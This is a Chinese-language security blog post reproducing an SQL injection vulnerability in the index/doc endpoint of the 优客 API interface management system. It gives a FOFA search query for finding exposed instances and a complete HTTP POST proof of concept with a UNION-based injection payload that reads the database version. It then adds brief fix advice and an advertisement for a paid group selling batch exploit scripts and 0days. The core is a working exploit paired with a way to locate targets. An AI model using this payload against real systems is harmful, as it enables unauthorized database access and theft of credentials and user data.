#  「漏洞复现」全新优客API接口管理系统 index/doc SQL注入漏洞   
冷漠安全  冷漠安全   2024-11-16 16:33  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
全新2024优客API接口管理系统，内置30+API接口，支持服务器信息，网站ICP备案，抖音无水印，QQ在线状态QQ头像，获取历史上的今天，IP签名档，ICO站标获，随机动漫图，网站标题获取，爱站权重获取，城市天气获取，随机一言，皮皮虾无水印，每日Bing壁纸，垃圾分类，查询手机号归属地，申通快递查询等接口功能。  
  
0x03  
  
**漏洞威胁**  
  
全新优客API接口管理系统 index/doc 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
body="public/static/index/css/flaghome.css"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qqCaTJIKwKiakqLurKcuh7SVrdU7yTzNIHgzDPoWWPGChQdz0QicMeSkHm3xKBFYkFS0MqM7wFVLUg/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
POST /index/index/doc HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Content-Type: application/x-www-form-urlencoded
Connection: close


id=') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,@@VERSION,NULL-- -
```  
  
查询数据库版本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qqCaTJIKwKiakqLurKcuh7SLc6KaIX2UBUHr025WyZicZvibT4yExPUAWKBFtF4icjqRFX138YtBQGPw/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qqCaTJIKwKiakqLurKcuh7Sn2GN4boHUwObWWDC4vKvMSslvStNUtiawavUNSicsyzeTVTZNpV9TFww/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qqCaTJIKwKiakqLurKcuh7S8Cf5wIQ0l3XEENTHcl2XguVTVC3Cib29MKcicLmgOZm3kakSIXJjKoZA/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0qqCaTJIKwKiakqLurKcuh7SbqdLwtPzq7tIIxqoUyt7ltbnR10c9M75WZHK2TpFwySvFocts9jHYQ/640?wx_fmt=gif&from=appmsg "")  
  
  
